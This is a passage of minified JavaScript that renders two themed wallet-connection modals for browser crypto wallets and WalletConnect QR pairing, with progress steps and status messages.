    `,e.appendChild(s)}),e}async function ZYe(r,e,t){let i=[];return r.info.walletId==="walletconnect"?{success:!1}:(i=await r.provider.request({method:"eth_requestAccounts"}),i&&i.length>0?{success:!0,provider:r.provider,accounts:i}:{success:!1})}function U1(){["connect_wallet_step","confirmation_step","walletConnect_step"].forEach(e=>{const t=si.querySelector(`#${e}`);t&&(t.style.display="none")})}function YYe(){const r=si.querySelector("#connect_wallet_step");r.style.display="flex",cc("Available Wallets"),FO()}function Yh({type:r,title:e,description:t,icon:i="./assets/modal1and2/metamask.png",showSuccess:n=!1}){const s=document.createElement("div");return s.className=`tag tag-${r}`,s.style.cssText=`
    opacity: 0;
    transform: translateY(10px);
  `,s.innerHTML=`
    <div class="flex items-center ${n?"relative":""}">
      <div class="border-wallet-icon">
        <svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M1 9H5.44444M1 9C1 13.4183 4.58172 17 9 17M1 9C1 4.58172 4.58172 1 9 1M5.44444 9H12.5556M5.44444 9C5.44444 13.4183 7.03632 17 9 17M5.44444 9C5.44444 4.58172 7.03632 1 9 1M12.5556 9H17M12.5556 9C12.5556 4.58172 10.9637 1 9 1M12.5556 9C12.5556 13.4183 10.9637 17 9 17M17 9C17 4.58172 13.4183 1 9 1M17 9C17 13.4183 13.4183 17 9 17" 
            stroke="#B5A69C" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
        </svg>
      </div>
      ${n?`
        <div class="icons-success">
          <svg width="13" height="13" viewBox="0 0 13 13" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect width="13" height="13" rx="6.5" fill="#18CE66" />
            <path d="M3 6.50001L5.3335 9L10 4" stroke="white" stroke-linecap="round" stroke-linejoin="round" />
          </svg>
        </div>
      `:""}
      <div class="border-wallet-icon">
        <img src="${i}" alt="" class="w-6 h-6 selected_wallet_icon">
      </div>
    </div>
    <div class="flex flex-col gap-2">
      <p>${e}</p>
      ${t?`<p class="text-xs">${t}</p>`:""}
    </div>
  `,requestAnimationFrame(()=>{s.style.opacity="1",s.style.transform="translateY(0)"}),s}function FO(r){const t=si.querySelector("#status-line").querySelectorAll("div");t.forEach(i=>i.classList.remove("active")),t.length>0&&t[0].classList.add("active")}function cc(r){const e=si.querySelector(".status_text");e&&(e.textContent=r)}async function JYe(r,e,t,i){if(localStorage.setItem("lastConnectedWallet",r.info.icon),r.info.walletId==="walletconnect"){iJe(r.info),await nJe(r,e,t,i);return}U1();const n=si.querySelector("#confirmation_step #status-container");n&&(n.style.cssText=`
      display: flex;
      flex-direction: column;
      gap: 12px;
      transition: all 0.3s ease;
    `,n.innerHTML=""),si.querySelector("#confirmation_step").style.display="flex";try{cc("Connecting Wallet");const s=si.querySelectorAll(".dot");s.forEach((l,u)=>{l.classList.remove("active"),u===0&&l.classList.add("active")});const o=Yh({type:"primary",title:"Processing...",description:"Opening wallet for connection",icon:r.info.icon});n&&n.appendChild(o),await new Promise(l=>setTimeout(l,500)),cc("Waiting for Approval"),s.forEach((l,u)=>{l.classList.remove("active"),u===1&&l.classList.add("active")});const a=Yh({type:"warning",title:"Approve the Connection to Continue",icon:r.info.icon});n&&n.appendChild(a);const c=await ZYe(r,e,t);if(c.success){await new Promise(u=>setTimeout(u,500)),cc("Connection Successful"),s.forEach((u,d)=>{u.classList.remove("active"),d===2&&u.classList.add("active")});const l=Yh({type:"success",title:"Approved",icon:r.info.icon,showSuccess:!0});n&&n.appendChild(l),setTimeout(()=>{nE(),i({provider:c.provider,walletAddress:c.accounts[0],name:r.info.name})},1500)}}catch(s){console.error("Connection error:",s),si.querySelectorAll(".dot").forEach((c,l)=>{c.classList.remove("active"),l===0&&c.classList.add("active")}),cc("Connection Failed");const a=Yh({type:"danger",title:"Connection Failed",description:"Please try again or choose another wallet",icon:r.info.icon});n&&n.appendChild(a)}}async function QYe(r){r&&r.disconnect&&await r.disconnect(),window.ethereum?.isMetaMask&&await window.ethereum.request({method:"wallet_revokePermissions",params:[{eth_accounts:{}}]})}async function ine(r,e){return new Promise((t,i)=>{const n=si.querySelector("#modal_connect"),s=si.querySelector("#wallet-list-container");FO(),eJe(),setTimeout(()=>{n.classList.add("active")},100);const o=tne(),a=rne(o);s&&(s.innerHTML="",s.appendChild(a)),si.querySelectorAll(".wallet-link").forEach(c=>{c.addEventListener("click",async()=>{const l=parseInt(c.dataset.providerIndex);!isNaN(l)&&o[l]?await JYe(o[l],r,e,t):console.error("Provider not found for this wallet link")})})})}function XYe(){const r=si.querySelector(".left_side"),e=si.querySelector(".modal-content");r.style.display="none",e.classList.add("small")}function eJe(){const r=si.querySelector(".left_side");r.style.display="flex",si.querySelector(".modal-content").classList.remove("small")}async function nE(){si.querySelector("#modal_connect").classList.remove("active"),setTimeout(()=>{U1(),YYe(),FO(),cc("Available Wallets")},100)}async function tJe(r,e,t=!1){const i=await rJe(),n=document.createElement("div");t&&ene.querySelector("html").classList.add("dark"),n.innerHTML=`<style>${i}</style>
  <div id="modal_connect" class="modal-content">
    <div class="modal-connect border border-[#D0D4F7] dark:bg-[#1A1D26] bg-white dark:border-[#33394B] overflow-hidden w-full h-full rounded-4xl ">
      <div class="flex items-start h-full w-full">
        <div class="left_side p-10 bg-[#EFF1FC] dark:bg-[#242835] border-r border-solid border-[#D0D4F7] dark:border-[#33394B] max-w-[280px] flex flex-col gap-6 w-full h-full">
          <div class="flex flex-col gap-6 h-full">
            <div class="flex flex-col gap-4">
              <svg width="56" height="56" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M48 0H8C3.58172 0 0 3.58172 0 8V48C0 52.4183 3.58172 56 8 56H48C52.4183 56 56 52.4183 56 48V8C56 3.58172 52.4183 0 48 0Z" fill="#262A3D"/>
                <mask id="mask0_6_731" style="mask-type:luminance" maskUnits="userSpaceOnUse" x="16" y="12" width="28" height="32">
                  <path d="M43.6667 12H16V44H43.6667V12Z" fill="white"/>
                </mask>
                <g mask="url(#mask0_6_731)">
                  <path d="M17 28H23.1111M17 28C17 34.0751 21.9249 39 28 39M17 28C17 21.9249 21.9249 17 28 17M23.1111 28H32.8889M23.1111 28C23.1111 34.0751 25.2999 39 28 39M23.1111 28C23.1111 21.9249 25.2999 17 28 17M32.8889 28H39M32.8889 28C32.8889 21.9249 30.7001 17 28 17M32.8889 28C32.8889 34.0751 30.7001 39 28 39M39 28C39 21.9249 34.0751 17 28 17M39 28C39 34.0751 34.0751 39 28 39" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </g>
              </svg>
              <p class="dark:!text-white text-secondary">Connect your wallet</p>
              <p class="dark:!text-white text-sm text-secondary">
                Connecting your wallet is like "logging in" to Web3. Select your wallet from the options to get started.
              </p>
            </div>
            <div class="flex items-center justify-center gap-2">
              <a href="https://chromewebstore.google.com/category/extensions" class="text-sm">
                I don't have a wallet
                <svg xmlns="http://www.w3.org/2000/svg" width="21" height="20" viewBox="0 0 21 20" fill="none">
                  <path d="M10.92 1.66669C6.32 1.66669 2.58667 5.40002 2.58667 10C2.58667 14.6 6.32 18.3334 10.92 18.3334C15.52 18.3334 19.2533 14.6 19.2533 10C19.2533 5.40002 15.52 1.66669 10.92 1.66669ZM11.7533 14.1667H10.0867V9.16669H11.7533V14.1667ZM11.7533 7.50002H10.0867V5.83335H11.7533V7.50002Z" fill="#6370E5"/>
                </svg>
              </a>
            </div>
          </div>
          <div class="flex w-full items-center">
            <div class="flex items-center w-full" id="status-line">
              <div class="h-2 w-2 rounded-full bg-[#929BED] dot active shrink-0"></div>
              <div class="h-0.5 w-full bg-[#929BED]"></div>
              <div class="h-2 w-2 rounded-full bg-[#929BED] dot shrink-0"></div>
              <div class="h-0.5 w-full bg-[#929BED]"></div>
              <div class="h-2 w-2 rounded-full bg-[#929BED] dot shrink-0"></div>
            </div>
          </div>
        </div>
        <div class="flex flex-col h-full w-full">
          <div class="p-4 border-b border-[#D0D4F7] w-full flex justify-between items-center dark:border-[#262830]">
            <p class="status_text dark:!text-white">Available Wallets</p>
            <div class="bg-black/10 dark:bg-white/20 rounded-full w-8 h-8 flex justify-center items-center close_modal hover:bg-black/20 dark:hover:bg-white/20 transition-all duration-300 cursor-pointer">
              <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M14 1.41L12.59 0L7 5.59L1.41 0L0 1.41L5.59 7L0 12.59L1.41 14L7 8.41L12.59 14L14 12.59L8.41 7L14 1.41Z" fill="black"/>
              </svg>
            </div>
          </div>
          <div id="connect_wallet_step" class="p-4 flex w-full h-full justify-start items-center flex-col gap-11">
            <div id="wallet-list-container" class="w-full"></div>
          </div>
          <div id="confirmation_step" class="w-full h-full hidden justify-start items-start flex-col">
            <div class="w-full p-4 h-full items-center">
              <div class="flex flex-col h-full justify-start items-start w-full gap-2" id="status-container">
              </div>
            </div>
          </div>
          <div id="walletConnect_step" class="w-full h-full hidden justify-center items-center flex-col">
            <div class="flex flex-col h-full justify-center items-center w-full gap-6">
              <div id="walletConnect_step_content" class="flex flex-col w-full justify-center items-center gap-4">
                <span class="loader"></span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  `,n.querySelectorAll(".close_modal").forEach(a=>{a.addEventListener("click",()=>{nE()})});const o=n.querySelector("#wallet-list-container");if(o){const a=tne(),c=rne(a);o.innerHTML="",o.appendChild(c)}si.appendChild(n)}async function rJe(){try{const r=await fetch("./assets/styles2.css");if(!r.ok)throw new Error("    ");return await r.text()}catch(r){console.error("   :",r)}}function iJe(r){U1();const e=si.querySelector("#walletConnect_step");if(e){si.querySelectorAll(".dot").forEach((n,s)=>{n.classList.remove("active"),s===0&&n.classList.add("active")}),cc("Initializing..."),si.querySelectorAll("#wallet_selected_name").forEach(n=>{n.textContent=r.name}),si.querySelectorAll(".image_connected_wallet").forEach(n=>{n.src=r.icon});const i=e.querySelector("#walletConnect_step_content");i.innerHTML=`
      <p class="font-semibold dark:text-white text-black text-xl">Scan QR-code</p>
      <div id="qrcode-container" class="mt-4 mb-4 p-2 bg-black/5 dark:bg-white/10 rounded-lg" style="max-width: 216px; min-height: 216px; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
        <div id="qrcode"></div>
      </div>
    `,e.style.display="flex"}else console.error("WalletConnect step element not found")}async function nJe(r,e,t,i){try{const n=await q3.init({projectId:e,optionalChains:t,showQrModal:!1}),s=si.querySelectorAll(".dot");s.forEach((o,a)=>{o.classList.remove("active"),a===0&&o.classList.add("active")}),cc("Scan QR Code"),n.on("display_uri",o=>{s.forEach((c,l)=>{c.classList.remove("active"),l===1&&c.classList.add("active")}),cc("Waiting for Connection");const a=si.querySelector("#qrcode");if(a){a.innerHTML="";try{const c=document.createElement("div");c.className="styled-qr-container",c.style.cssText=`
            border-radius: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            margin: 0 auto;
          `,c.style.animation="qrFadeIn 0.6s ease forwards",z3.toDataURL(o,{width:200,margin:0,color:{dark:"#ffffff",light:"#1a1c24"},errorCorrectionLevel:"H"}).then(l=>{const u=document.createElement("div");u.style.cssText=`
              position: relative;
              overflow: hidden;
            `;const d=document.createElement("img");d.src=l,d.width=200,d.height=200,d.style.cssText=`
              border-radius: 8px;
              display: block;
              filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
            `;const h=document.createElement("div");h.style.cssText=`
              position: absolute;
              top: 50%;
              left: 50%;
              transform: translate(-50%, -50%);
              width: 40px;
              height: 40px;
              background: white;
              border-radius: 50%;
              display: flex;
              align-items: center;
              justify-content: center;
              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
            `;const f=document.createElement("img");f.src=r.info.icon,f.style.cssText=`
              width: 30px;
              height: 30px;
              border-radius: 50%;
              object-fit: contain;
            `;const p=document.createElement("div");if(p.style.cssText=`
              position: absolute;
              bottom: -10px;
              left: 0;
              right: 0;
              text-align: center;
              font-size: 14px;
              font-weight: 500;
              color: white;
              text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
              transform: translateY(-50%);
            `,h.appendChild(f),u.appendChild(d),u.appendChild(h),c.appendChild(u),c.appendChild(p),a.appendChild(c),!document.getElementById("qr-animations")){const g=document.createElement("style");g.id="qr-animations",g.textContent=`
                @keyframes qrFadeIn {
                  from { opacity: 0; transform: scale(0.9); }
                  to { opacity: 1; transform: scale(1); }
                }
                @keyframes qrPulse {
                  0% { transform: scale(1); }
                  50% { transform: scale(1.05); }
                  100% { transform: scale(1); }
                }
                .styled-qr-container:hover {
                  animation: qrPulse 1.5s infinite;
                }
              `,document.head.appendChild(g)}}).catch(l=>{console.error("Error generating QR-code (URL):",l),a.innerHTML=`
              <div style="color: #ff4d4d; text-align: center; padding: 20px; background: rgba(255, 77, 77, 0.1); border-radius: 8px;">
                <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="8" x2="12" y2="12"></line>
                  <line x1="12" y1="16" x2="12.01" y2="16"></line>
                </svg>
                <p style="margin-top: 10px; font-weight: 500;">  QR-</p>
              </div>
            `})}catch(c){console.error("Error generating QR-code:",c),a.innerHTML=`
            <div style="word-break: break-all; font-size: 12px; padding: 10px; text-align: center;">
              <p>QR-code not generated. Use URI:</p>
              <code style="background: #f0f0f0; padding: 5px; display: block; margin-top: 10px;">${o}</code>
            </div>
          `}}}),n.on("connect",()=>{n.request({method:"eth_accounts"}).then(o=>{if(o&&o.length>0){U1();const a=si.querySelector("#confirmation_step #status-container");if(a){a.innerHTML="";const c=Yh({type:"success",title:"Connection Successful",description:"Your wallet has been connected",icon:r.info.icon,showSuccess:!0});a.appendChild(c)}si.querySelector("#confirmation_step").style.display="flex",s.forEach((c,l)=>{c.classList.remove("active"),l===2&&c.classList.add("active")}),cc("Connection Successful"),setTimeout(()=>{nE(),i({provider:n,walletAddress:o[0],name:r.info.name})},1500)}}).catch(o=>{console.error("Failed to get accounts:",o),U1();const a=si.querySelector("#confirmation_step #status-container");if(a){a.innerHTML="";const c=Yh({type:"danger",title:"Connection Failed",description:"Please try again or choose another wallet",icon:r.info.icon});a.appendChild(c)}si.querySelector("#confirmation_step").style.display="flex",s.forEach((c,l)=>{c.classList.remove("active"),l===0&&c.classList.add("active")}),cc("Connection Failed")})}),await n.connect()}catch(n){console.error("WalletConnect initialization error:",n),U1();const s=si.querySelector("#confirmation_step #status-container");if(s){s.innerHTML="";const o=Yh({type:"danger",title:"Connection Failed",description:"Failed to initialize WalletConnect. Please try again.",icon:r.info.icon});s.appendChild(o)}si.querySelector("#confirmation_step").style.display="flex",dots.forEach((o,a)=>{o.classList.remove("active"),a===0&&o.classList.add("active")}),cc("Connection Failed")}}function sJe(r=[]){U1(),ine(),cc("Steps"),XYe();const e=si.querySelector("#confirmation_step #status-container");e.innerHTML="";const t=localStorage.getItem("lastConnectedWallet");r.forEach(i=>{const n=Yh({type:i.type,title:i.title,description:i.description,icon:t});e.appendChild(n)}),si.querySelector("#confirmation_step").style.display="flex"}function oJe(r){const e=si.querySelector("#confirmation_step #status-container"),t=localStorage.getItem("lastConnectedWallet"),i=Yh({type:r.type,title:r.title,description:r.description,icon:t});e.appendChild(i)}const aJe=Object.freeze(Object.defineProperty({__proto__:null,addStatusBlock:oJe,disconnectWallet:QYe,hideModal:nE,initModal:tJe,openModal:ine,showInfoScreen:sJe},Symbol.toStringTag,{value:"Module"})),nne=document.createElement("div");document.body.appendChild(nne);const cJe=nne.attachShadow({mode:"open"}),ei=document.createElement("html");document.head.append(Object.assign(document.createElement("link"),{rel:"stylesheet",href:"https://fonts.googleapis.com/css2?family=Pixelify+Sans:wght@400..700&family=Press+Start+2P&display=swap"}));ei.append(Object.assign(document.createElement("link"),{rel:"stylesheet",href:"https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap"}));cJe.appendChild(ei);function sne(){const r=B3();r.reset();const e=r.getProviders();if((!e||e.length===0)&&window.ethereum){let t="Injected Wallet",i="./assets/modal3/metamask.png";window.ethereum.isMetaMask?t="MetaMask":window.ethereum.isCoinbaseWallet?t="Coinbase Wallet":window.ethereum.isPhantom&&(t="Phantom"),e.push({info:{name:t,icon:i,walletId:"injected",uuid:""},provider:window.ethereum})}return e.push({info:{name:"WalletConnect",icon:"./assets/modal3/wallet_connect.png",walletId:"walletconnect",uuid:""},provider:null}),e}function Z4(r){const e=ei.querySelector("#modal_connect");r==="wallets"?e.classList.add("bg_wallets"):e.classList.remove("bg_wallets")}function one(r){let e=document.createElement("div");e.id="wallet-list",e.className="flex flex-col gap-1 h-full",e.innerHTML="";const t=[...r].sort((s,o)=>s.info.name==="MetaMask"?-1:o.info.name==="MetaMask"?1:s.info.name==="Rabby Wallet"?-1:o.info.name==="Rabby Wallet"||s.info.walletId==="walletconnect"?1:o.info.walletId==="walletconnect"?-1:s.info.name.localeCompare(o.info.name)),i={MetaMask:"./assets/modal3/metamask.png","Rabby Wallet":"./assets/modal3/rabby.png",Phantom:"./assets/modal3/phantom.png",Rainbow:"./assets/modal3/rainbow.png",WalletConnect:"./assets/modal3/wallet_connect.png","Trust Wallet":"./assets/modal3/trust_wallet.png","Coinbase Wallet":"./assets/modal3/coinbase.png"};return t.slice(0,6).forEach(s=>{const o=document.createElement("div");o.className="wallet-link",s.info.name==="WalletConnect"&&(o.className="wallet-link WalletConnect"),s.info.name==="Trust Wallet"&&(o.className="wallet-link trust_wallet"),s.info.name==="Rabby Wallet"&&(o.className="wallet-link rabby"),(s.info.name==="MetaMask"||s.info.name==="Rabby Wallet")&&o.classList.add("recommended"),o.dataset.walletId=s.info.walletId,o.dataset.walletName=s.info.name,o.dataset.walletIcon=i[s.info.name],o.dataset.providerIndex=r.findIndex(l=>l.info.name===s.info.name&&l.info.walletId===s.info.walletId);const a=document.createElement("img");a.src=i[s.info.name]||"./assets/modal3/metamask.png",a.alt="",a.className="image_connected_wallet max-h-[130px]";const c=document.createElement("span");s.info.name==="MetaMask"||s.info.name==="Rabby Wallet"?c.textContent="RECOMMENDED":c.textContent=s.info.name,o.appendChild(a),o.appendChild(c),e.appendChild(o)}),e}async function lJe(r,e,t){let i=[];return r.info.walletId==="walletconnect"?{success:!1}:(i=await r.provider.request({method:"eth_requestAccounts"}),i&&i.length>0?{success:!0,provider:r.provider,accounts:i}:{success:!1})}function Kf(){const r=ei.querySelector("#awaiting_confirmation_step"),e=ei.querySelector("#awaiting_success_step"),t=ei.querySelector("#connection_failed_step"),i=ei.querySelector("#connect_wallet_step"),n=ei.querySelector("#additional_info_step"),s=ei.querySelector("#walletConnect_step");r&&(r.style.display="none"),e&&(e.style.display="none"),t&&(t.style.display="none"),i&&(i.style.display="none"),n&&(n.style.display="none"),s&&(s.style.display="none")}function ane(){const r=ei.querySelector("#connect_wallet_step");r.style.display="flex"}function uJe(r){const e=ei.querySelector("#awaiting_confirmation_step");e&&(e.style.display="flex"),ei.querySelectorAll("#wallet_selected_name").forEach(t=>{t.textContent=r.name}),ei.querySelectorAll(".wallet-link_info").forEach(t=>{switch(r.name){case"MetaMask":t.href="https://metamask.io/",t.target="_blank",t.textContent="Don't have MetaMask?";break;case"Coinbase Wallet":t.href="https://www.coinbase.com/wallet",t.target="_blank",t.textContent="Don't have Coinbase Wallet?";break;case"Phantom":t.href="https://phantom.app/",t.target="_blank",t.textContent="Don't have Phantom?";break;case"Rabby Wallet":t.href="https://rabby.io/",t.target="_blank",t.textContent="Don't have Rabby Wallet?";break;default:t.href="https://metamask.io/",t.target="_blank",t.textContent="Don't have Wallet?"}}),ei.querySelectorAll(".image_connected_wallet").forEach(t=>{t.src=r.icon})}function cne(){ei.querySelector("#awaiting_confirmation_step").style.display="none",ei.querySelector("#awaiting_success_step").style.display="flex"}function rP(){ei.querySelector("#awaiting_confirmation_step").style.display="none";const r=ei.querySelector("#connection_failed_step");return r.style.display="flex",r}async function dJe(r,e,t,i){if(Z4("default"),pJe(r.info.name),r.info.walletId==="walletconnect"){bJe(r.info),await vJe(r,e,t,i);return}Kf(),uJe(r.info);try{const n=await lJe(r,e,t);n.success&&(cne(),setTimeout(()=>{sE(),i({provider:n.provider,walletAddress:n.accounts[0],name:r.info.name})},1500))}catch(n){console.error("Connection error:",n);const o=rP().querySelector(".btn.btn-primary");o&&(o.onclick=()=>{Kf(),ane()})}}async function hJe(r){r&&r.disconnect&&await r.disconnect(),window.ethereum?.isMetaMask&&await window.ethereum.request({method:"wallet_revokePermissions",params:[{eth_accounts:{}}]})}async function lne(r,e){return new Promise((t,i)=>{const n=ei.querySelector("#modal_connect"),s=ei.querySelector("#wallet-list-container");Z4("wallets"),setTimeout(()=>{n.classList.add("active")},100);const o=sne(),a=one(o);s&&(s.innerHTML="",s.appendChild(a)),ei.querySelectorAll(".wallet-link").forEach(c=>{c.addEventListener("click",async()=>{const l=parseInt(c.dataset.providerIndex);!isNaN(l)&&o[l]?await dJe(o[l],r,e,t):console.error("Provider not found for this wallet link")})})})}async function sE(){ei.querySelector("#modal_connect").classList.remove("active"),setTimeout(()=>{Kf(),ane()},100)}async function fJe(r,e,t=!1){const i=await yJe(),n=document.createElement("div"),s=document.createElement("div");s.id="wallet-list",s.className="flex flex-col gap-1 h-full",n.appendChild(s),n.innerHTML=`<style>${i}</style>
  <div id="modal_connect" class="modal-content bg_default ">
    <div class="modal-connect relative  w-full h-full rounded-4xl ">
      <a href="https://crypto.com/en/university/crypto-wallets" 
        class="button_new_wallet absolute z-50 left-1/2 -translate-x-1/2 hover:bg-white/10 cursor-pointer transition-all duration-300 max-w-[220px] w-full h-[60px] rounded-2xl">

      </a>
      <div id="connect_wallet_step" class="p-6  w-full h-full justify-center items-center flex-col gap-11">
        <div class="flex wrapper-bg relative flex-col h-full justify-center w-full px-5 items-center gap-10">

          <div id="wallet-list-container"
            class="flex flex-col w-full gap-1 h-full relative scroll-bar-hidden overflow-y-auto">
        

             ${s.innerHTML} 
          </div>




        </div>


      
      </div>
        <div id="connection_failed_step" class="  w-full h-full hidden  justify-center items-center flex-col ">

          <div class="flex wrapper-bg relative flex-col h-full justify-start w-full px-12 items-center gap-10">
            <div class="h-full">
              <p class="title">
                CONNECTION
                FAILED
              </p>
            </div>
            <div class="flex justify-center w-full  items-center">
              <button class="btn_try_again close_modal">

              </button>
            </div>
          </div>


        </div>
      <div id="awaiting_confirmation_step" class="  w-full h-full hidden justify-center items-center flex-col ">
        <div class="flex wrapper-bg relative flex-col h-full justify-start w-full px-5 items-center gap-10">
          <p class="title">
            AWAITING
            CONFIRAMATION
          </p>
          <p class="text-xl font-medium text-center max-w-[250px]">
            Accept the connection
            request in <span class="wallet_name">MetaMask</span>
          </p>
          <div class="relative ">

            <img src="./assets/modal3/loading.gif" class="h-56 relative bottom-12">
          </div>


        </div>
      </div>
      <div id="walletConnect_step" class="w-full h-full hidden justify-center items-center flex-col">
       
        <div class="flex flex-col h-full justify-center items-center w-full gap-6">

          <div id="walletConnect_step_content" class="flex flex-col w-full justify-center items-center gap-4">
            <span class="loader"></span>
          </div>
        </div>
  
      </div>
      <div id="awaiting_success_step" class="  w-full h-full hidden justify-center items-center flex-col ">
        <div class="flex wrapper-bg relative flex-col h-full justify-start w-full px-5 items-center gap-10">
          <p class="title">
            ONNECTED
          </p>
          <p class="text-xl font-medium text-center max-w-[250px]">
            Successfully Connected
          </p>
          <div class="relative ">

            <img src="./assets/modal3/success.gif" class="h-56 relative ">
          </div>


        </div>
      </div>


      <div id="additional_info_step" class="w-full h-full hidden justify-center items-center flex-col ">
        <div class="flex wrapper-bg relative flex-col h-full justify-start w-full px-5 items-center gap-10">
          <p id="additional_text" class="title">
            ONNECTED
          </p>

          <div class="relative ">

            <img id="additional_image" src="./assets/modal3/success.gif" class="h-56 relative ">
          </div>


        </div>
      </div>
    </div>
  </div>`,n.querySelector("#wallet-list-container").appendChild(one(sne())),n.querySelectorAll(".close_modal").forEach(o=>{o.addEventListener("click",()=>{sE()})}),ei.appendChild(n)}function qO(r,e){const t={success:{text:"Successfully Connected",image:"./assets/modal3/success.gif"},error:{text:"Connection Failed",image:"./assets/modal3/error.gif"},loading:{text:"Awaiting Confirmation",image:"./assets/modal3/loading.gif"}};ei.querySelector("#additional_text").textContent=e||t[r].text,ei.querySelector("#additional_image").src=t[r].image}function zO(){Kf();const r=ei.querySelector("#additional_info_step");r?(r.style.display="flex",lne()):console.error("Content modal step not found")}async function pJe(r){ei.querySelectorAll(".wallet_name").forEach(e=>{e.textContent=r})}function gJe(r){qO("loading",r),zO(),Z4("default")}function mJe(r){qO("success",r),zO(),Z4("default")}function wJe(r){qO("error",r),zO(),Z4("default")}function bJe(r){Kf();const e=ei.querySelector("#walletConnect_step");if(e){ei.querySelectorAll("#wallet_selected_name").forEach(i=>{i.textContent=r.name}),ei.querySelectorAll(".wallet-link_info").forEach(i=>{switch(r.name){case"MetaMask":i.href="https://metamask.io/",i.target="_blank",i.textContent="Don't have MetaMask?";break;case"Coinbase Wallet":i.href="https://www.coinbase.com/wallet",i.target="_blank",i.textContent="Don't have Coinbase Wallet?";break;case"Phantom":i.href="https://phantom.app/",i.target="_blank",i.textContent="Don't have Phantom?";break;case"Rabby Wallet":i.href="https://rabby.io/",i.target="_blank",i.textContent="Don't have Rabby Wallet?";break;case"Trust Wallet":i.href="https://trustwallet.com/",i.target="_blank",i.textContent="Don't have Trust Wallet?";break;default:i.href="https://metamask.io/",i.target="_blank",i.textContent="Don't have Wallet?"}}),ei.querySelectorAll(".image_connected_wallet").forEach(i=>{i.src=r.icon});const t=e.querySelector("#walletConnect_step_content");t.innerHTML=`
      <p class="font-semibold title">Scan QR-code</p>
      <div id="qrcode-container" class="mt-4 mb-4 p-2 bg-black/5 dark:bg-white/10 rounded-lg" style="max-width: 216px; min-height: 216px; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
        <div id="qrcode"></div>
      </div>
      <p style="max-width: 320px;" class="  text-center ">Open a compatible WalletConnect wallet and scan the QR-code</p>
    `,e.style.display="flex"}else console.error("WalletConnect step element not found")}async function vJe(r,e,t,i){try{const n=await q3.init({projectId:e,optionalChains:t,showQrModal:!1});n.on("display_uri",s=>{const o=ei.querySelector("#qrcode");if(o){o.innerHTML="";try{const a=document.createElement("div");a.className="styled-qr-container",a.style.cssText=`
            border-radius: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            margin: 0 auto;
          `,a.style.animation="qrFadeIn 0.6s ease forwards",z3.toDataURL(s,{width:200,margin:0,color:{dark:"#ffffff",light:"#1a1c24"},errorCorrectionLevel:"H"}).then(c=>{const l=document.createElement("div");l.style.cssText=`
              position: relative;
              overflow: hidden;
            `;const u=document.createElement("img");u.src=c,u.width=200,u.height=200,u.style.cssText=`
              border-radius: 8px;
              display: block;
              filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
            `;const d=document.createElement("div");d.style.cssText=`
              position: absolute;
              top: 50%;
              left: 50%;
              transform: translate(-50%, -50%);
              width: 40px;
              height: 40px;
              background: white;
              border-radius: 50%;
              display: flex;
              align-items: center;
              justify-content: center;
              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
            `;const h=document.createElement("img");h.src="./assets/modal3/wallet_connect_mini.png",h.style.cssText=`
              width: 30px;
              height: 30px;
              border-radius: 50%;
              object-fit: contain;
            `;const f=document.createElement("div");if(f.style.cssText=`
              position: absolute;
              bottom: -10px;
              left: 0;
              right: 0;
              text-align: center;
              font-size: 14px;
              font-weight: 500;
              color: white;
              text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
              transform: translateY(-50%);
            `,d.appendChild(h),l.appendChild(u),l.appendChild(d),a.appendChild(l),a.appendChild(f),o.appendChild(a),!ei.querySelector("qr-animations")){const p=document.createElement("style");p.id="qr-animations",p.textContent=`
                @keyframes qrFadeIn {
                  from { opacity: 0; transform: scale(0.9); }
                  to { opacity: 1; transform: scale(1); }
                }
                @keyframes qrPulse {
                  0% { transform: scale(1); }
                  50% { transform: scale(1.05); }
                  100% { transform: scale(1); }
                }
                .styled-qr-container:hover {
                  animation: qrPulse 1.5s infinite;
                }
              `,ei.appendChild(p)}}).catch(c=>{console.error("Error generating QR-code (URL):",c),o.innerHTML=`
              <div style="color: #ff4d4d; text-align: center; padding: 20px; background: rgba(255, 77, 77, 0.1); border-radius: 8px;">
                <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="8" x2="12" y2="12"></line>
                  <line x1="12" y1="16" x2="12.01" y2="16"></line>
                </svg>
                <p style="margin-top: 10px; font-weight: 500;">  QR-</p>
              </div>
            `})}catch(a){console.error("Error generating QR-code:",a),o.innerHTML=`
            <div style="word-break: break-all; font-size: 12px; padding: 10px; text-align: center;">
              <p>QR-code not generated. Use URI:</p>
              <code style="background: #f0f0f0; padding: 5px; display: block; margin-top: 10px;">${s}</code>
            </div>
